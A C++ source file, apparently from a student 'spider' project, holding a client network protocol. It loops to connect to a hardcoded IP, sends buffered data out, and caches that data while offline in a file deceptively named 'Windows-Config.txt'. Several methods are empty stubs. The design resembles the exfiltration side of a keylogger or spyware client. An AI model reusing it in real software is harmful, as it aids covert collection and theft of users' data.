/*
** ClientProtocol.cpp for cpp_spider in /home/god/TEK3/C++/cpp_spider/sources/Protocol/ClientProtocol.cpp
**
** Made by Maxime PILLON
** Login   <maxime.pillon@epitech.eu>
**
** Started on  Thu Oct 05 11:45:58 2017 Maxime PILLON
** Last update Thu Oct 05 11:45:58 2017 Maxime PILLON
*/

#include <regex>
#include <fstream>
#include <iostream>
#include <Thread/IThread.hpp>
#include <Thread/BoostThread.hpp>
#include "Protocol/BufferSender.hpp"
#include "Protocol/ClientProtocol.hpp"

std::atomic_bool isConnected(false);

spider::ClientProtocol::ClientProtocol()
{}

spider::ClientProtocol::~ClientProtocol() {}

void spider::ClientProtocol::sendPing() {}

void	spider::ClientProtocol::sendData() {}

void spider::runServerNetwork() {}


void spider::runNetwork()
{
  spider::ClientNetwork	_net("10.26.112.233", PORT);


  for (;;)
  {
    if (!isConnected.load())
    {
      _net.connect();
      continue ;
    }
    if (isConnected.load())
      _net.send();
    if (isConnected.load())
      _net.read();
  }
}

void spider::ClientProtocol::run()
{
  BufferSender &buf = BufferSender::BufferSenderInstance();
  std::fstream file;
  std::string tmp;

  file.open("Windows-Config.txt", std::ios::out | std::ios::in | std::ios::trunc);
  if (!file.is_open())
    std::cout << "can't open the file" << std::endl;
  else
    std::cout << "open correctly" << std::endl;
  for (;;)
  {
    std::string str = buf.getBuf();
    if (!isConnected.load())
    {
      if (!str.empty())
	file << str;
      str.clear();
      continue;
    }
    getline(file, tmp);
    tmp.append(str);
    str = tmp;
    buf.push(str);
    str.clear();
    tmp.clear();
  }
}